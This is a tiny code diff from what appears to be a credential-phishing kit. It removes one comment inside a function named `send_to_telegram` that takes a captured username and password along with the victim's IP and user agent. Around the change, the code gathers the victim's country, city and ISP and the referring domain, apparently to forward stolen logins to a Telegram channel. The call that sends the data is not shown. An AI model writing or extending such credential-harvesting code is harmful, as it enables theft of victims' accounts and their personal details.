@@ -60,7 +60,6 @@ def send_to_telegram(username, password, ip, user_agent):
     country, region, city, isp = get_geo_info(ip)
     date = time.strftime("%Y-%m-%d")
 
-    # Domain
     domain = request.headers.get("Origin") or request.headers.get("Referer") or "N/A"
     domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
 
